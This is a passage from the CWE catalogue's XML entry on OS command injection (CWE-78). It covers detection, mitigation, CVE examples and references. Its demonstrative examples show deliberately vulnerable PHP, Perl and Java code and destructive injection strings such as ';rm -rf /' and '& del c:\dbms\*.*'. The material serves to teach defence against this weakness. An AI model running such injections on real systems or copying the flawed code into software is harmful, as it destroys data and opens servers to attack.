               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>845</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 00 - Input Validation and Data Sanitization (IDS)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>875</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 07 - Characters and Strings (STR)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>878</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 10 - Environment (ENV)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>990</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Tainted Input to Command--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">928</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>929</Relationship_Target_ID>
               <!--OWASP Top Ten 2013 Category A1 - Injection--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Shell injection</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Shell metacharacters</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Terminology_Notes>
            <Terminology_Note>
               <Text>The "OS command injection" phrase carries different meanings to different
						people. For some people, it only refers to cases in which the attacker
						injects command separators into arguments for an application-controlled
						program that is being invoked. For some people, it refers to any type of
						attack that can allow the attacker to execute OS commands of their own
						choosing. This usage could include untrusted search path weaknesses
						(CWE-426) that cause the application to find and execute an
						attacker-controlled program. Further complicating the issue is the case when
						argument injection (CWE-88) allows alternate command-line switches or
						options to be inserted into the command line, such as an "-exec" switch
						whose purpose may be to execute the subsequent argument as a command (this
						-exec switch exists in the UNIX "find" command, for example). In this latter
						case, however, CWE-88 could be regarded as the primary weakness in a chain
						with CWE-78.</Text>
            </Terminology_Note>
         </Terminology_Notes>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Scope>Non-Repudiation</Consequence_Scope>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>DoS: crash / exit /
						restart</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Read files or
						directories</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Modify files or
						directories</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Read application
						data</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Modify application
						data</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Hide activities</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Attackers could execute unauthorized commands, which could then be
							used to disable the software, or read and modify data for which the
							attacker does not have permissions to access directly. Since the
							targeted application is directly executing the commands instead of the
							attacker, any malicious activities may appear to come from the
							application or the application's owner.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can often be detected using automated static analysis
							tools. Many modern tools use data flow analysis or constraint-based
							techniques to minimize the number of false positives.</Text>
                  <Text>Automated static analysis might not be able to recognize when proper
							input validation is being performed, leading to false positives - i.e.,
							warnings that do not have any security consequences or require any code
							changes.</Text>
                  <Text>Automated static analysis might not be able to detect the usage of
							custom API functions or third-party libraries that indirectly invoke OS
							commands, leading to false negatives - especially if the API/library
							code is not available for analysis.</Text>
               </Method_Description>
               <Method_Effectiveness_Notes>
                  <Text>This is not a perfect solution, since 100% accuracy and coverage are
							not feasible.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method_Name>Automated Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using dynamic tools and techniques that
							interact with the software using large test suites with many diverse
							inputs, such as fuzz testing (fuzzing), robustness testing, and fault
							injection. The software's operation may slow down, but it should not
							become unstable, crash, or generate incorrect results.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-10">
               <Method_Name>Manual Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Since this weakness does not typically appear frequently within a
							single software package, manual white box techniques may be able to
							provide sufficient code coverage and reduction of false positives if all
							potentially-vulnerable operations can be assessed within limited time
							constraints.</Text>
               </Method_Description>
               <Method_Effectiveness>High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                        <Text>Database Scanners</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>If at all possible, use library calls rather than external processes
							to recreate the desired functionality.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Sandbox or Jail</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run the code in a "jail" or similar sandbox environment that enforces
							strict boundaries between the process and the operating system. This may
							effectively restrict which files can be accessed in a particular
							directory or which commands can be executed by the software.</Text>
                  <Text>OS-level examples include the Unix chroot jail, AppArmor, and SELinux.
							In general, managed code may provide some protection. For example,
							java.io.FilePermission in the Java SecurityManager allows the software
							to specify restrictions on file operations.</Text>
                  <Text>This may not be a feasible solution, and it only limits the impact to
							the operating system; the rest of the application may still be subject
							to compromise.</Text>
                  <Text>Be careful to avoid CWE-243 and other weaknesses related to jails.
						</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Limited</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>The effectiveness of this mitigation depends on the prevention
							capabilities of the specific sandbox or jail being used and might only
							help to reduce the scope of an attack, such as restricting the attacker
							to certain system calls or limiting the portion of the file system that
							can be accessed. </Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Identify and Reduce Attack Surface</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>For any data that will be used to generate a command to be executed,
							keep as much of that data out of external control as possible. For
							example, in web applications, this may require storing the data locally
							in the session's state instead of sending it out to the client in a
							hidden form field.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For any security checks that are performed on the client side, ensure
							that these checks are duplicated on the server side, in order to avoid
							CWE-602. Attackers can bypass the client-side checks by modifying values
							after the checks have been performed, or by changing the client to
							remove the client-side checks entirely. Then, these modified values
							would be submitted to the server.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.3">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
                  <Text>For example, consider using the ESAPI Encoding control [R.78.8] or a
							similar tool, library, or framework. These will help the programmer
							encode outputs in a manner less prone to error.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-28">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Output Encoding</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>While it is risky to use dynamically-generated query strings, code, or
							commands that mix control and data together, sometimes it may be
							unavoidable. Properly quote arguments and escape any special characters
							within those arguments. The most conservative approach is to escape or
							filter all characters that do not pass an extremely strict whitelist
							(such as everything that is not alphanumeric or white space). If some
							special characters are still needed, such as white space, wrap each
							argument in quotes after the escaping/filtering step. Be careful of
							argument injection (CWE-88).</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>If the program to be executed allows arguments to be specified within
							an input file or from standard input, then consider using that mode to
							pass arguments instead of the command line.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Parameterization</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>If available, use structured mechanisms that automatically enforce the
							separation between data and code. These mechanisms may be able to
							provide the relevant quoting, encoding, and validation automatically,
							instead of relying on the developer to provide this capability at every
							point where output is generated.</Text>
                  <Text>Some languages offer multiple functions that can be used to invoke
							commands. Where possible, identify any function that invokes a command
							shell using a single string, and replace it with a function that
							requires individual arguments. These functions typically perform
							appropriate quoting and filtering of arguments. For example, in C, the
							system() function accepts a string that contains the entire command to
							be executed, whereas execl(), execve(), and others require an array of
							strings, one for each argument. In Windows, CreateProcess() only accepts
							one command at a time. In Perl, if system() is provided with an array of
							arguments, then it will quote each of the arguments.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Assume all input is malicious. Use an "accept known good" input
							validation strategy, i.e., use a whitelist of acceptable inputs that
							strictly conform to specifications. Reject any input that does not
							strictly conform to specifications, or transform it into something that
							does.</Text>
                  <Text>When performing input validation, consider all potentially relevant
							properties, including length, type of input, the full range of
							acceptable values, missing or extra inputs, syntax, consistency across
							related fields, and conformance to business rules. As an example of
							business rule logic, "boat" may be syntactically valid because it only
							contains alphanumeric characters, but it is not valid if the input is
							only expected to contain colors such as "red" or "blue."</Text>
                  <Text>Do not rely exclusively on looking for malicious or malformed inputs
							(i.e., do not rely on a blacklist). A blacklist is likely to miss at
							least one undesirable input, especially if the code's environment
							changes. This can give attackers enough room to bypass the intended
							validation. However, blacklists can be useful for detecting potential
							attacks or determining which inputs are so malformed that they should be
							rejected outright.</Text>
                  <Text>When constructing OS command strings, use stringent whitelists that
							limit the character set based on the expected value of the parameter in
							the request. This will indirectly limit the scope of an attack, but this
							technique is less important than proper output encoding and
							escaping.</Text>
                  <Text>Note that proper output encoding, escaping, and quoting is the most
							effective solution for preventing OS command injection, although input
							validation may provide some defense-in-depth. This is because it
							effectively limits what will appear in output. Input validation will not
							always prevent OS command injection, especially if you are required to
							support free-form text fields that could contain arbitrary characters.
							For example, when invoking a mail program, you might need to allow the
							subject field to contain otherwise-dangerous inputs like ";" and
							"&gt;" characters, which would need to be escaped or otherwise
							handled. In this case, stripping the character might reduce the risk of
							OS command injection, but it would produce incorrect behavior because
							the subject field would not be recorded as the user intended. This might
							seem to be a minor inconvenience, but it could be more important when
							the program relies on well-structured subject lines in order to pass
							messages to other components.</Text>
                  <Text>Even if you make a mistake in your validation (such as forgetting one
							out of 100 input fields), appropriate encoding is still likely to
							protect you from injection-based attacks. As long as it is not done in
							isolation, input validation is still a useful technique, since it may
							significantly reduce your attack surface, allow you to detect some
							attacks, and provide other security benefits that proper encoding does
							not address.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Enforcement by Conversion</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>When the set of acceptable objects, such as filenames or URLs, is
							limited or known, create a mapping from a set of fixed input values
							(such as numeric IDs) to the actual filenames or URLs, and reject all
							other inputs.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-32">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Compilation or Build Hardening</Mitigation_Strategy>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run the code in an environment that performs automatic taint
							propagation and prevents any command execution that uses tainted
							variables, such as Perl's "-T" switch. This will force the program to
							perform validation steps that remove the taint, although you must be
							careful to correctly validate your inputs so that you do not
							accidentally mark dangerous inputs as untainted (see CWE-183 and
							CWE-184).</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Ensure that error messages only contain minimal details that are
							useful to the intended audience, and nobody else. The messages need to
							strike the balance between being too cryptic and not being cryptic
							enough. They should not necessarily reveal the methods that were used to
							determine the error. Such detailed information can be used to refine the
							original attack to increase the chances of success.</Text>
                  <Text>If errors must be tracked in some detail, capture them in log messages
							- but consider what could occur if the log messages can be viewed by
							attackers. Avoid recording highly sensitive information such as
							passwords in any form. Avoid inconsistent messaging that might
							accidentally tip off an attacker about internal state, such as whether a
							username is valid or not.</Text>
                  <Text>In the context of OS Command Injection, error information passed back
							to the user might reveal whether an OS command is being executed and
							possibly which command is being used.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Sandbox or Jail</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use runtime policy enforcement to create a whitelist of allowable
							commands, then prevent use of any command that does not appear in the
							whitelist. Technologies such as AppArmor are available to do
							this.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Firewall</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use an application firewall that can detect attacks against this
							weakness. It can be beneficial in cases in which the code cannot be
							fixed (because it is controlled by a third party), as an emergency
							prevention measure while more comprehensive software assurance measures
							are applied, or to provide defense in depth.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Moderate</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>An application firewall might not cover all possible input vectors. In
							addition, attack techniques might be available to bypass the protection
							mechanism, such as using malformed inputs that can still be processed by
							the component that receives those inputs. Depending on functionality, an
							application firewall might inadvertently reject or modify legitimate
							requests. Finally, some manual effort may be required for
							customization.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run your code using the lowest privileges that are required to
							accomplish the necessary tasks [R.78.9]. If possible, create isolated
							accounts with limited privileges that are only used for a single task.
							That way, a successful attack will not immediately give the attacker
							access to the rest of the software or its environment. For example,
							database applications rarely need to run as the database administrator,
							especially in day-to-day operations.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>When using PHP, configure the application so that it does not use
							register_globals. During implementation, develop the application so that
							it does not rely on this feature, but be wary of implementing a
							register_globals emulation that is subject to weaknesses such as CWE-95,
							CWE-621, and similar issues.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This example code intends to take the name of a user and list the
						contents of that user's home directory. It is subject to the first variant
						of OS command injection. </Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code> $userName = $_POST["user"];</Code>
                     <Code> $command = 'ls -l /home/' . $userName;</Code>
                     <Code> system($command);</Code>
                  </Block>
                  <Text>The $userName variable is not checked for malicious input. An attacker
							could set the $userName variable to an arbitrary OS command such as: </Text>
                  <Block Block_Nature="Attack">
                     <Code> ;rm -rf /</Code>
                  </Block>
                  <Text>Which would result in $command being:</Text>
                  <Block Block_Nature="Result">
                     <Code>ls -l /home/;rm -rf /</Code>
                  </Block>
                  <Text> Since the semi-colon is a command separator in Unix, the OS would
							first execute the ls command, then the rm command, deleting the entire
							file system.</Text>
                  <Text>Also note that this example code is vulnerable to Path Traversal
							(CWE-22) and Untrusted Search Path (CWE-426) attacks.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example is a web application that intends to perform a DNS
						lookup of a user-supplied domain name. It is subject to the first variant of
						OS command injection.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Perl</Code_Example_Language>
                     <Code>use CGI qw(:standard);</Code>
                     <Code>$name = param('name');</Code>
                     <Code>$nslookup = "/path/to/nslookup";</Code>
                     <Code>print header;</Code>
                     <Code>if (open($fh, "$nslookup $name|")) {</Code>
                     <Block>
                        <Code>while (&lt;$fh&gt;) {</Code>
                        <Block>
                           <Code>print escapeHTML($_);</Code>
                           <Code>print "&lt;br&gt;\n";</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>close($fh);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>Suppose an attacker provides a domain name like this:</Text>
                  <Block Block_Nature="Attack">
                     <Code>cwe.mitre.org%20%3B%20/bin/ls%20-l</Code>
                  </Block>
                  <Text>The "%3B" sequence decodes to the ";" character, and the %20 decodes
							to a space. The open() statement would then process a string like
							this:</Text>
                  <Block Block_Nature="Result">
                     <Code>/path/to/nslookup cwe.mitre.org ; /bin/ls -l</Code>
                  </Block>
                  <Text>As a result, the attacker executes the "/bin/ls -l" command and gets a
							list of all the files in the program's working directory. The input
							could be replaced with much more dangerous commands, such as installing
							a malicious program on the server.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The example below reads the name of a shell script to execute from
						the system properties. It is subject to the second variant of OS command
						injection.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>String script = System.getProperty("SCRIPTNAME");</Code>
                     <Code>if (script != null)</Code>
                     <Block>
                        <Code>System.exec(script);</Code>
                     </Block>
                  </Block>
                  <Text>If an attacker has control over this property, then they could modify
							the property to point to a dangerous program.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the example below, a method is used to transform geographic
						coordinates from latitude and longitude format to UTM format. The method
						gets the input coordinates from a user through a HTTP request and executes a
						program local to the application server that performs the transformation.
						The method passes the latitude and longitude coordinates as a command-line
						option to the external program and will perform some processing to retrieve
						the results of the transformation and return the resulting UTM coordinates. </Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>public String coordinateTransformLatLonToUTM(String
								coordinates)</Code>
                     <Code>{</Code>
                     <Block>
                        <Code>String utmCoords = null;</Code>
                        <Code>try {</Code>
                        <Block>
                           <Code>String latlonCoords = coordinates;</Code>
                           <Code>Runtime rt = Runtime.getRuntime();</Code>
                           <Code>Process exec = rt.exec("cmd.exe /C latlon2utm.exe -" +
										latlonCoords);</Code>
                           <Comment>// process results of coordinate transform</Comment>
                           <Comment>// ...</Comment>
                        </Block>
                        <Code>}</Code>
                        <Code>catch(Exception e) {...}</Code>
                        <Code>return utmCoords;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>However, the method does not verify that the contents of the
							coordinates input parameter includes only correctly-formatted latitude
							and longitude coordinates. If the input coordinates were not validated
							prior to the call to this method, a malicious user could execute another
							program local to the application server by appending '&amp;'
							followed by the command for another program to the end of the coordinate
							string. The '&amp;' instructs the Windows operating system to
							execute another program.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-28">
               <Intro_Text>The following code is from an administrative web application
						designed to allow users to kick off a backup of an Oracle database using a
						batch-file wrapper around the rman utility and then run a cleanup.bat script
						to delete some temporary files. The script rmanDB.bat accepts a single
						command line parameter, which specifies what type of backup to perform.
						Because access to the database is restricted, the application runs the
						backup as a privileged user.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>...</Code>
                     <Code>String btype = request.getParameter("backuptype");</Code>
                     <Code>String cmd = new String("cmd.exe /K \"</Code>
                     <Block>
                        <Code>c:\\util\\rmanDB.bat "</Code>
                        <Code>+btype+</Code>
                        <Code>"&amp;&amp;c:\\utl\\cleanup.bat\"")</Code>
                     </Block>
                     <Code>System.Runtime.getRuntime().exec(cmd);</Code>
                     <Code>...</Code>
                  </Block>
                  <Text>The problem here is that the program does not do any validation on the
							backuptype parameter read from the user. Typically the Runtime.exec()
							function will not execute multiple commands, but in this case the
							program first runs the cmd.exe shell in order to run multiple commands
							with a single call to Runtime.exec(). Once the shell is invoked, it will
							happily execute multiple commands separated by two ampersands. If an
							attacker passes a string of the form "&amp; del c:\\dbms\\*.*", then
							the application will execute this command along with the others
							specified by the program. Because of the nature of the application, it
							runs with the privileges necessary to interact with the database, which
							means whatever command the attacker injects will run with those
							privileges as well.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-1999-0067</Observed_Example_Reference>
               <Observed_Example_Description>Canonical example. CGI program does not neutralize
						"|" metacharacter when invoking a phonebook
						program.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-1246</Observed_Example_Reference>
               <Observed_Example_Description>Language interpreter's mail function accepts
						another argument that is concatenated to a string used in a dangerous
						popen() call. Since there is no neutralization of this argument, both OS
						Command Injection (CWE-78) and Argument Injection (CWE-88) are
						possible.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-0061</Observed_Example_Reference>
               <Observed_Example_Description>Web server allows command execution using "|"
						(pipe) character.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2003-0041</Observed_Example_Reference>
               <Observed_Example_Description>FTP client does not filter "|" from filenames
						returned by the server, allowing for OS command
						injection.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-2575</Observed_Example_Reference>
               <Observed_Example_Description>Shell metacharacters in a filename in a ZIP
						archive</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-1898</Observed_Example_Reference>
               <Observed_Example_Description>Shell metacharacters in a telnet:// link are not
						properly handled when the launching application processes the
						link.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-4304</Observed_Example_Reference>
               <Observed_Example_Description>OS command injection through environment
						variable.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-4796</Observed_Example_Reference>
               <Observed_Example_Description>OS command injection through https://
						URLs</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-3572</Observed_Example_Reference>
               <Observed_Example_Description>Chain: incomplete blacklist for OS command
						injection</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2012-1988</Observed_Example_Reference>
               <Observed_Example_Description>Product allows remote users to execute arbitrary
						commands by creating a file whose pathname contains shell
						metacharacters.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Program invocation</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>System Process</Affected_Resource>
         </Affected_Resources>
         <Research_Gaps>
            <Research_Gap>
               <Text>More investigation is needed into the distinction between the OS command
						injection variants, including the role with argument injection (CWE-88).
						Equivalent distinctions may exist in other injection-related problems such
						as SQL injection.</Text>
            </Research_Gap>
         </Research_Gaps>
         <References>
            <Reference Local_Reference_ID="R.78.1">
               <Reference_Author>G. Hoglund</Reference_Author>
               <Reference_Author>G. McGraw</Reference_Author>
               <Reference_Title>Exploiting Software: How to Break Code</Reference_Title>
               <Reference_Publisher>Addison-Wesley</Reference_Publisher>
               <Reference_PubDate>2004-02</Reference_PubDate>
            </Reference>
            <Reference Local_Reference_ID="R.78.2">
               <Reference_Author>Pascal Meunier</Reference_Author>
               <Reference_Title>Meta-Character Vulnerabilities</Reference_Title>
               <Reference_PubDate>2008-02-20</Reference_PubDate>
               <Reference_Link>http://www.cs.purdue.edu/homes/cs390s/slides/week09.pdf</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.78.3">
               <Reference_Author>Robert Auger</Reference_Author>
               <Reference_Title>OS Commanding</Reference_Title>
               <Reference_PubDate>2009-06</Reference_PubDate>
               <Reference_Link>http://projects.webappsec.org/OS-Commanding</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.78.4">
               <Reference_Author> Lincoln Stein</Reference_Author>
               <Reference_Author> John Stewart</Reference_Author>
               <Reference_Title>The World Wide Web Security FAQ</Reference_Title>
               <Reference_Section>chapter: "CGI Scripts"</Reference_Section>
               <Reference_PubDate>2002-02-04</Reference_PubDate>
               <Reference_Link>http://www.w3.org/Security/Faq/wwwsf4.html</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.78.5">
               <Reference_Author>Jordan Dimov, Cigital</Reference_Author>
               <Reference_Title>Security Issues in Perl Scripts</Reference_Title>
